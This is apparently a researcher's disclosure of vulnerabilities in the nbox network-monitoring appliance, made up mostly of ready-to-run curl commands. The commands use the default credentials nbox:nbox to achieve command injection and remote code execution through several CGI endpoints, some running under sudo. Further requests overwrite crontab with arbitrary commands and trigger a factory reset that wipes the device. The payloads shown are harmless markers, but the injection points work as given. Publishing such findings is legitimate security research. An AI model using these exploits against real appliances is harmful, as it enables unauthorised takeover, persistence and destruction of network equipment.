 
(The issues were found originally in nbox 2.3 and confirmed in nbox 2.5)
 
 
 
To make things easier, I created a Vagrantfile with provisioning so you can have your own nbox appliance and test my findings or give it a shot. There is more stuff to be found, trust me :)
 
https://github.com/javuto/nbox-pwnage 
 
 
 
 
 
 
 
RCE: POST against https://NTOP-BOX/ntop-bin/write_conf_users.cgi with parameter cmd=touch /tmp/HACK
  curl -sk --user nbox:nbox --data &#039;cmd=touch /tmp/HACK&#039; &#039;https://NTOP-BOX/ntop-bin/write_conf_users.cgi&#039;
 
 
 
RCE: POST against https://NTOP-BOX/ntop-bin/rrd_net_graph.cgi with parameters interface=;touch /tmp/HACK;
  curl -sk --user nbox:nbox --data &#039;interface=;touch /tmp/HACK;&#039; &#039;https://NTOP-BOX/ntop-bin/rrd_net_graph.cgi&#039;
 
 
 
RCE (Wrapped in sudo): GET https://NTOP-BOX/ntop-bin/pcap_upload.cgi?dir=|touch%20/tmp/HACK&pcap=pcap
  curl -sk --user nbox:nbox &#039;https://NTOP-BOX/ntop-bin/pcap_upload.cgi?dir=|touch%20/tmp/HACK&pcap=pcap&#039;
 
 
 
RCE (Wrapped in sudo): GET https://NTOP-BOX/ntop-bin/sudowrapper.cgi?script=adm_storage_info.cgi&params=P%22|whoami%3E%20%22/tmp/HACK%22|echo%20%22
  curl -sk --user nbox:nbox &#039;https://NTOP-BOX/ntop-bin/sudowrapper.cgi?script=adm_storage_info.cgi&params=P%22|whoami%3E%20%22/tmp/HACK%22|echo%20%22&#039;
 
 
 
RCE: POST against https://NTOP-BOX/ntop-bin/do_mergecap.cgi with parameters opt=Merge&base_dir=/tmp&out_dir=/tmp/DOESNTEXIST;touch /tmp/HACK;exit%200
  curl -sk --user nbox:nbox --data &#039;opt=Merge&base_dir=/tmp&out_dir=/tmp/DOESNTEXIST;touch /tmp/HACK;exit 0&#039; &#039;https://NTOP-BOX/ntop-bin/do_mergecap.cgi&#039;
 
There are some other interesting things, for example, it was possible to have a persistent XSS by rewriting crontab with a XSS payload on it, but they fixed it in 2.5. However the crontab overwrite (Wrapped in sudo) is still possible:
 
  GET https://NTOP-BOX/ntop-bin/do_crontab.cgi?act_cron=COMMANDS%20TO%20GO%20IN%20CRON
 
  curl -sk --user nbox:nbox &#039;https://NTOP-BOX/ntop-bin/do_crontab.cgi?act_cron=COMMANDS%20TO%20GO%20IN%20CRON&#039;
 
 
 
The last one is a CSRF that leaves the machine fried, by resetting the machine completely:
 
  GET https://NTOP-BOX/ntop-bin/do_factory_reset.cgi
 
  curl -sk --user nbox:nbox &#039;https://NTOP-BOX/ntop-bin/do_factory_reset.cgi&#039;
 
 
 
Modules for metasploit and BeEF will come soon. I hope this time the issues are not just silently patched...
 
 
 
If you have any questions or feedback, hit me up in twitter (@javutin)

